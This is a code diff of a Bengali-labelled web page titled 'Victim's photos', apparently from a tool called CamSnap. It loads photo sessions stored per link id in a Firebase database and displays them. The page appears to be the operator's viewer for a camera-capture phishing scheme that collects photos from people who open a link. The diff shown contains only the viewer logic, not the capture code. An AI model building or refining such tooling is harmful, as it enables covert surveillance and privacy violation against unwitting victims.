@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html>
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ভিকটিমের ছবি • CamSnap</title>
+  <title>ভিকটিমের ছবি</title>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
   <style>
@@ -40,19 +40,13 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-// ID ১০০% সঠিকভাবে নেওয়া
 let id = new URLSearchParams(location.search).get('id');
-if (!id) {
-  id = location.pathname.split('/').pop();
-  if (id === 'viewer.html' || id === '') id = null;
-}
+if (!id) id = location.pathname.split('/').pop();
 
-if (!id) {
+if (!id || id === 'viewer.html') {
   document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:100px;'>লিংক ভুল!</h1>";
-  throw new Error("No ID");
 }
 
-// সঠিক পথে ডাটা লোড (এটাই ছিল সমস্যা!)
 db.ref('links/' + id + '/sessions').on('value', (snapshot) => {
   const sessions = snapshot.val();
   const container = document.getElementById('content');
@@ -66,7 +60,7 @@ db.ref('links/' + id + '/sessions').on('value', (snapshot) => {
   Object.keys(sessions).sort((a,b) => b.localeCompare(a)).forEach(date => {
     const session = sessions[date];
     const photos = session.photos || [];
-    const time = session.time || "সময় পাওয়া যায়নি";
+    const time = session.time || '';
 
     html += `
       <div class="session">
